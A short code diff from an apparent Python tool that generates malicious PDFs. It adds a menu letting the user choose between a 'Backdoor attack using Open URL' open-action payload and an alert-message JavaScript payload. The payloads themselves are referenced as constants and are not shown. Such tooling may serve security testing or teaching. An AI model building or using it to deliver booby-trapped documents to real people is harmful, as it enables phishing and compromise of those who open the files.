@@ -35,9 +35,33 @@ def generate_malicious_pdf(js_code, input_pdf, output_pdf):
     print(f"JavaScript code embedded into {output_pdf}.")
 
 
+def choose_payload():
+    """
+    Choose the payload to embed in the PDF file.
+    :return: type: str: The payload to embed.
+    """
+    payload = None
+
+    while payload is None:
+
+        print("Choose the payload to embed:")
+        print("1. Backdoor attack using Open URL")
+        print("2. Alert message")
+        choice = int(input("Enter the payload number: "))
+
+        if choice == 1:
+            payload = const.PAYLOAD_LAUNCH_URL_OPEN_ACTION
+        elif choice == 2:
+            payload = const.JS_CODE
+        else:
+            print("Invalid choice.")
+    return payload
+
+
 def main():
     args = cli()
-    generate_malicious_pdf(const.PAYLOAD_LAUNCH_URL_OPEN_ACTION, args.input, args.output)
+    payload = choose_payload()
+    generate_malicious_pdf(payload, args.input, args.output)
 
 
 if __name__ == "__main__":
